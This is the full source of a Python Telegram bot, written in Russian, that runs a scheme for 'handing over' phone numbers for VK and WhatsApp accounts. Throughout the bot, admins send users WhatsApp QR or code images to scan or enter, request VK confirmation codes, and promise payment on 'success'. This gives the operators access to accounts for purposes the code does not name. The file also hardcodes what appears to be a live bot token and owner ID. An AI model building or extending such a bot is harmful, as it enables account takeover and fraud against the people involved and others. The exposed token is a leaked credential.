import asyncio
import sqlite3
import logging
from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import CommandStart
from aiogram.types import (
    Message, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton, 
    InlineKeyboardMarkup, InlineKeyboardButton, URLInputFile
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties

# --- КОНФИГ ---
TOKEN = '8529283906:AAE3QsZ-CNmnWSf-yS33PlZ829eDjvhzok4'
OWNER_ID = 8119723042

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)

# --- БАЗА ДАННЫХ ---
def db_query(query, params=(), fetchone=False, fetchall=False, commit=False):
    conn = sqlite3.connect('bot_v3.db')
    cursor = conn.cursor()
    cursor.execute(query, params)
    res = None
    if fetchone: res = cursor.fetchone()
    if fetchall: res = cursor.fetchall()
    if commit: conn.commit()
    conn.close()
    return res

def init_db():
    queries = [
        'CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY)',
        'CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)',
        'CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)',
        'CREATE TABLE IF NOT EXISTS apps (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, platform TEXT, phone TEXT, code_type TEXT, status TEXT)'
    ]
    for q in queries: db_query(q, commit=True)
    db_query('INSERT OR IGNORE INTO admins (user_id) VALUES (?)', (OWNER_ID,), commit=True)
    db_query('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)', ('photo', 'https://telegra.ph/file/1802927d6d5257cbdbbfb.png'), commit=True)
    db_query('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)', ('chan_id', '-1000000000'), commit=True)
    db_query('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)', ('chan_url', 'https://t.me/example'), commit=True)

# --- СОСТОЯНИЯ ---
class FSMSettings(StatesGroup):
    photo = State()
    chan_id = State()
    chan_url = State()
    add_adm = State()
    broadcast = State()

class FSMApp(StatesGroup):
    platform = State()
    phone = State()
    code_type = State()
    wait_admin = State()

class FSMAdminAction(StatesGroup):
    send_photo = State() # Для ВЦ
    request_code = State() # Для ВК

# --- КЛАВИАТУРЫ ---
def main_kb(uid):
    admins = [r[0] for r in db_query('SELECT user_id FROM admins', fetchall=True)]
    kb = [
        [KeyboardButton(text="📱 Сдать номер"), KeyboardButton(text="📊 Отчет")],
        [KeyboardButton(text="⏳ Очередь"), KeyboardButton(text="💸 Вывод")],
        [KeyboardButton(text="👨‍💻 Поддержка")]
    ]
    if uid in admins: kb.append([KeyboardButton(text="⚙️ Админка")])
    return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

# --- ПРОВЕРКА ПОДПИСКИ ---
async def is_sub(uid):
    cid = db_query('SELECT value FROM settings WHERE key="chan_id"', fetchone=True)[0]
    try:
        chat = await bot.get_chat_member(chat_id=cid, user_id=uid)
        return chat.status in ['member', 'administrator', 'creator']
    except: return True # Если бот не в канале, пропускаем (чтобы не застрять)

# --- ГЛАВНОЕ МЕНЮ ---
@router.message(CommandStart())
async def start(message: Message):
    db_query('INSERT OR IGNORE INTO users (user_id) VALUES (?)', (message.from_user.id,), commit=True)
    if not await is_sub(message.from_user.id):
        url = db_query('SELECT value FROM settings WHERE key="chan_url"', fetchone=True)[0]
        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Подписаться", url=url)]])
        return await message.answer("❌ Подпишитесь на канал для работы!", reply_markup=kb)
    
    photo = db_query('SELECT value FROM settings WHERE key="photo"', fetchone=True)[0]
    await message.answer_photo(photo=photo, caption="Привет! Выбери действие:", reply_markup=main_kb(message.from_user.id))

# --- ЛОГИКА СДАЧИ НОМЕРА ---
@router.message(F.text == "📱 Сдать номер")
async def app_start(message: Message, state: FSMContext):
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="ВК", callback_data="p_ВК"),
        InlineKeyboardButton(text="ВЦ", callback_data="p_ВЦ")
    ]])
    await message.answer("Выберите платформу:", reply_markup=kb)
    await state.set_state(FSMApp.platform)

@router.callback_query(F.data.startswith("p_"))
async def app_plat(call: CallbackQuery, state: FSMContext):
    plat = call.data.split("_")[1]
    await state.update_data(platform=plat)
    await call.message.edit_text(f"Введите номер телефона для {plat}:")
    await state.set_state(FSMApp.phone)

@router.message(FSMApp.phone)
async def app_phone(message: Message, state: FSMContext):
    data = await state.get_data()
    await state.update_data(phone=message.text)
    
    if data['platform'] == 'ВК':
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Пуш код", callback_data="ct_Пуш"),
             InlineKeyboardButton(text="QR код", callback_data="ct_QR")]
        ])
        await message.answer("Выберите тип входа для ВК:", reply_markup=kb)
        await state.set_state(FSMApp.code_type)
    else:
        # WhatsApp
        aid = db_query('INSERT INTO apps (user_id, platform, phone, code_type, status) VALUES (?, ?, ?, ?, ?)', 
                      (message.from_user.id, "ВЦ", message.text, "Нет", "Ожидание"), commit=True, fetchone=True)
        await message.answer("✅ Номер в очереди. Ждите фото с кодом от админа.")
        await notify_admins(message.from_user.id, "ВЦ", message.text, "Нет")
        await state.clear()

@router.callback_query(F.data.startswith("ct_"))
async def app_vk_type(call: CallbackQuery, state: FSMContext):
    ctype = call.data.split("_")[1]
    data = await state.get_data()
    db_query('INSERT INTO apps (user_id, platform, phone, code_type, status) VALUES (?, ?, ?, ?, ?)', 
            (call.from_user.id, "ВК", data['phone'], ctype, "Ожидание"), commit=True)
    await call.message.edit_text(f"✅ Заявка ВК ({ctype}) принята в очередь. Ожидайте запроса кода админом.")
    await notify_admins(call.from_user.id, "ВК", data['phone'], ctype)
    await state.clear()

async def notify_admins(uid, plat, phone, ctype):
    adms = [r[0] for r in db_query('SELECT user_id FROM admins', fetchall=True)]
    text = f"🔔 <b>Новая заявка!</b>\nЮзер: {uid}\nПлатформа: {plat}\nНомер: {phone}\nТип: {ctype}"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отправить фото (ВЦ)", callback_data=f"adm_v_photo_{uid}") if plat == "ВЦ" else 
         InlineKeyboardButton(text="Запросить код (ВК)", callback_data=f"adm_v_code_{uid}")],
        [InlineKeyboardButton(text="✅ Успех", callback_data=f"adm_ok_{uid}"),
         InlineKeyboardButton(text="❌ Слет", callback_data=f"adm_fail_{uid}")]
    ])
    for a in adms:
        try: await bot.send_message(a, text, reply_markup=kb)
        except: pass

# --- ДЕЙСТВИЯ АДМИНА С НОМЕРОМ ---
@router.callback_query(F.data.startswith("adm_v_photo_"))
async def adm_photo_req(call: CallbackQuery, state: FSMContext):
    uid = call.data.split("_")[3]
    await state.update_data(target_id=uid)
    await call.message.answer("Пришлите фото с QR/кодом для пользователя:")
    await state.set_state(FSMAdminAction.send_photo)

@router.message(FSMAdminAction.send_photo, F.photo)
async def adm_send_photo_to_user(message: Message, state: FSMContext):
    data = await state.get_data()
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Ввел", callback_data="u_done"),
         InlineKeyboardButton(text="Повтор", callback_data="u_retry")],
        [InlineKeyboardButton(text="Отмена", callback_data="u_cancel")]
    ])
    try:
        await bot.send_photo(data['target_id'], photo=message.photo[-1].file_id, caption="Админ прислал код! Нажмите кнопку после ввода:", reply_markup=kb)
        await message.answer("✅ Фото отправлено пользователю.")
    except: await message.answer("❌ Не удалось отправить.")
    await state.clear()

@router.callback_query(F.data.startswith("adm_v_code_"))
async def adm_code_req(call: CallbackQuery):
    uid = call.data.split("_")[3]
    try:
        await bot.send_message(uid, "🔔 Админ просит прислать код подтверждения! Введите его прямо сюда:")
        await call.answer("Запрос отправлен")
    except: await call.answer("Ошибка связи")

@router.callback_query(F.data.startswith("adm_ok_"))
async def adm_res_ok(call: CallbackQuery):
    uid = call.data.split("_")[2]
    await bot.send_message(uid, "✅ <b>Номер успешно принят!</b>\nАдмин скоро напишет для выплаты.")
    await call.message.edit_text(call.message.text + "\n\nСТАТУС: УСПЕХ")

@router.callback_query(F.data.startswith("adm_fail_"))
async def adm_res_fail(call: CallbackQuery):
    uid = call.data.split("_")[2]
    await bot.send_message(uid, "⚠️ К сожалению, по номеру произошел слёт.")
    await call.message.edit_text(call.message.text + "\n\nСТАТУС: СЛЁТ")

# --- ОТВЕТЫ ПОЛЬЗОВАТЕЛЯ НА ВЦ ---
@router.callback_query(F.data.startswith("u_"))
async def user_reply(call: CallbackQuery):
    action = call.data.split("_")[1]
    status_map = {"done": "ВВЕЛ", "retry": "ПОВТОР", "cancel": "ОТМЕНА"}
    adms = [r[0] for r in db_query('SELECT user_id FROM admins', fetchall=True)]
    for a in adms:
        try: await bot.send_message(a, f"👤 Юзер {call.from_user.id} нажал: <b>{status_map[action]}</b>")
        except: pass
    await call.message.edit_caption(caption=f"Вы нажали: {status_map[action]}")

# --- АДМИН ПАНЕЛЬ ---
@router.message(F.text == "⚙️ Админка")
async def adm_main(message: Message):
    if message.from_user.id not in [r[0] for r in db_query('SELECT user_id FROM admins', fetchall=True)]: return
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📢 Рассылка", callback_data="a_brd"), InlineKeyboardButton(text="🖼 Фото", callback_data="a_photo")],
        [InlineKeyboardButton(text="🆔 Канал ID", callback_data="a_cid"), InlineKeyboardButton(text="🔗 Канал URL", callback_data="a_curl")],
        [InlineKeyboardButton(text="👤 +Админ", callback_data="a_add"), InlineKeyboardButton(text="🧹 Очистить очередь", callback_data="a_clr")]
    ])
    await message.answer("🛠 Настройки бота:", reply_markup=kb)

@router.callback_query(F.data == "a_photo")
async def adm_st_photo(call: CallbackQuery, state: FSMContext):
    await call.message.answer("Пришли фото:"); await state.set_state(FSMSettings.photo)
@router.message(FSMSettings.photo, F.photo)
async def adm_save_photo(message: Message, state: FSMContext):
    db_query('UPDATE settings SET value=? WHERE key="photo"', (message.photo[-1].file_id,), commit=True)
    await message.answer("✅ Сохранено"); await state.clear()

@router.callback_query(F.data == "a_cid")
async def adm_st_cid(call: CallbackQuery, state: FSMContext):
    await call.message.answer("Введи ID канала (с минусом):"); await state.set_state(FSMSettings.chan_id)
@router.message(FSMSettings.chan_id)
async def adm_save_cid(message: Message, state: FSMContext):
    db_query('UPDATE settings SET value=? WHERE key="chan_id"', (message.text,), commit=True)
    await message.answer("✅ ID обновлен"); await state.clear()

@router.callback_query(F.data == "a_curl")
async def adm_st_url(call: CallbackQuery, state: FSMContext):
    await call.message.answer("Введи ссылку на канал:"); await state.set_state(FSMSettings.chan_url)
@router.message(FSMSettings.chan_url)
async def adm_save_url(message: Message, state: FSMContext):
    db_query('UPDATE settings SET value=? WHERE key="chan_url"', (message.text,), commit=True)
    await message.answer("✅ Ссылка обновлена"); await state.clear()

# --- ПРОЧЕЕ ---
@router.message(F.text == "⏳ Очередь")
async def show_q(message: Message):
    q = db_query('SELECT platform, phone FROM apps WHERE status="Ожидание"', fetchall=True)
    if not q: return await message.answer("Очередь пуста")
    txt = "⏳ <b>Очередь:</b>\n" + "\n".join([f"- {i[0]} | {i[1][:5]}***" for i in q])
    await message.answer(txt)

@router.message(F.text == "📊 Отчет")
async def report(message: Message, state: FSMContext):
    await message.answer("Напишите номер для проверки пруфов:")
    await state.set_state(FSMApp.phone) # Используем состояние телефона для простоты

@router.message(F.text == "👨‍💻 Поддержка")
async def supp(message: Message):
    await message.answer("По всем вопросам: @твой_логин")

async def main():
    init_db()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
